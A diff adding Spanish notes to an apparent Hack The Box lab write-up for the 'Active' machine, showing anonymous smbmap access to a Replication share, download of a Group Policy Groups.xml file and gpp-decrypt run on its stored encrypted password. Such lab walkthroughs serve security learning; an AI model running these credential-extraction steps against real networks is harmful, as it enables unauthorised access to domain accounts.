@@ -57,6 +57,18 @@ Este se suele encontrar en el archivo `groups.xml`. Se suele encontrar en la rut
 smbmap -H 10.129.9.24 -u "" -p "" -r Replication/active.htb/Policies
 ```
 
+EN este caso lo hemos encontrado en la ruta  `Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups`
+
+Nos descargaremos el archivo
+```shell
+smbmap -H 10.129.9.24 -u "" -p "" --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+```
+
+Al leer el archivo encontramos una contraseña que no esta en texto claro pero la podemos desencriptar usando [[GPP-DECRYPT]]
+```shell
+gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+```
+
 
 
 
